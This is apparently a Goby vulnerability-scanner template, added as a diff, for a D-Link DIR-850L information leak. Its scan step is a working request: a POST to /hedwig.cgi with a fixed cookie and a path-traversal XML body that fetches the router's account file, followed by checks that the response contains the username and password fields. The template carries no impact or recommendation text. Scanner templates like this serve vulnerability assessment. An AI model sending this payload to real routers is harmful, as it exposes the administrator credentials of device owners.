@@ -1,0 +1,116 @@
+{
+      "Name": "D-Link DIR-850L Info Leak",
+      "Level": "3",
+      "Tags": [
+            "infoleak"
+      ],
+      "GobyQuery": "app=\"DIR-850L\" || title=\"DIR-850L\"",
+      "Description": "D-Link is a global leader in designing and developing networking and connectivity products for consumers, small businesses, medium to large-sized enterprises, and service providers.",
+      "Product": "DIR-850L",
+      "Homepage": "https://www.dlink.com/",
+      "Author": "",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://xz.aliyun.com/t/2941"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/hedwig.cgi",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "text/xml",
+                              "Cookie": "uid=R8tBjwtFc7"
+                        },
+                        "data_type": "text",
+                        "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "&lt;/usrid&gt;",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "&lt;/password&gt;",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "&lt;result&gt;OK&lt;/result&gt;",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/test.php",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "test",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
